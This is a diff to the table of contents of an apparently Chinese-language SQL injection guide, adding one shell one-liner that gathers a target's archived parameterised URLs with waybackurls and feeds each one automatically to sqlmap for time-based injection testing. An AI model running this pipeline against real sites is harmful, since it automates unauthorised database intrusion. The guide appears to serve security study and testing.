@@ -11,7 +11,8 @@
 ### 第3步：[注入类型](/injectionTypes)
 
 ### 第4步：[注入技术](/injectionTechniques)
-
+SQLMap from Waybackurls
+waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
 ### 第5步：[攻击查询](/attackQueries)
 
 ## 贡献
